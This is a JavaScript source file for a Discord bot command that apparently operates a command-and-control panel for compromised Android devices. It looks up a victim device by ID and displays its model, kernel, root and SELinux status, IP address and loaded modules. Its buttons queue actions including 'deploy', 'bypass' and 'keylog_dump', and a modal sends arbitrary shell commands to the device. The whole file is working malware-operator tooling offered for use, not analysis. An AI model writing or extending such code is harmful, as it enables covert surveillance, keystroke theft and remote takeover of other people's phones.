import { EmbedBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder } from 'discord.js'
import { actionButtons, sendCommand, commandSentEmbed, randomGif } from './_utils.js'

export const name = 'target'

export async function execute(message, args, { supabase, setTarget, formatTime }) {
  const deviceId = args.join(' ').trim()
  if (!deviceId) {
    return message.reply('❌ Usage: `!target <device_id>`')
  }

  const { data: dev } = await supabase
    .from('devices')
    .select('*')
    .eq('device_id', deviceId)
    .single()

  if (!dev) {
    return message.reply({
      embeds: [
        new EmbedBuilder()
          .setColor(0xff3355)
          .setTitle('❌ Device Not Found')
          .setDescription(`No device with ID \`${deviceId}\``)
          .setTimestamp(),
      ],
    })
  }

  setTarget(message.guild.id, message.author.id, deviceId)

  const online = dev.last_seen && (Date.now() - new Date(dev.last_seen).getTime() < 300000)

  const embed = new EmbedBuilder()
    .setColor(online ? 0x00ff88 : 0xff3355)
    .setTitle(`🎯 Target Locked`)
    .setImage(randomGif('target'))
    .setDescription(`\`\`\`\n${dev.device_id}\n\`\`\``)
    .addFields(
      { name: '📱 Model', value: dev.model || '?', inline: true },
      { name: '🤖 Android', value: dev.android_ver || '?', inline: true },
      { name: '⚙ Kernel', value: dev.kernel || '?', inline: true },
      { name: '🔓 Root', value: dev.root_status || '?', inline: true },
      { name: '🛡 SELinux', value: dev.selinux || '?', inline: true },
      { name: '🌐 IP', value: dev.ip || '?', inline: true },
      { name: 'Status', value: online ? '🟢 ONLINE' : '🔴 OFFLINE', inline: false },
      { name: 'Last Seen', value: formatTime(dev.last_seen), inline: true },
      { name: 'Modules', value: (dev.modules?.length ? dev.modules.join(', ') : 'none') || 'none', inline: false },
      { name: 'Uptime', value: dev.uptime ? `${Math.floor(dev.uptime / 3600)}h ${Math.floor((dev.uptime % 3600) / 60)}m` : '?', inline: true },
    )
    .setFooter({ text: 'Click buttons below for quick actions' })
    .setTimestamp()

  await message.reply({ embeds: [embed], components: [actionButtons(deviceId)] })
}

export async function handleButton(interaction, args, { supabase, getTarget, formatTime }) {
  const action = args[0]
  const deviceId = args[1] || getTarget(interaction.guildId, interaction.user.id)

  if (!deviceId) {
    return interaction.reply({ embeds: [new EmbedBuilder().setColor(0xff3355).setTitle('❌ No Target').setDescription('No active target.').setTimestamp()], ephemeral: true })
  }

  if (action === 'shell') {
    const modal = new ModalBuilder()
      .setCustomId(`c2:shell:run:${deviceId}`)
      .setTitle('💻 Shell Command')

    const cmdInput = new TextInputBuilder()
      .setCustomId('command')
      .setLabel('Enter shell command')
      .setStyle(TextInputStyle.Short)
      .setPlaceholder('e.g. id, uname -a, ls -la /data/local/tmp')
      .setRequired(true)

    modal.addComponents(new ActionRowBuilder().addComponents(cmdInput))
    return interaction.showModal(modal)
  }

  if (['deploy', 'bypass', 'keylog_dump', 'diagnostic', 'panic'].includes(action)) {
    await interaction.deferReply()
    const cmd = await sendCommand(supabase, deviceId, action, {})
    if (!cmd) return interaction.editReply({ embeds: [new EmbedBuilder().setColor(0xff3355).setTitle('❌ Failed').setTimestamp()] })
    await interaction.editReply({ embeds: [commandSentEmbed(deviceId, action, cmd.id)] })
    return
  }
}
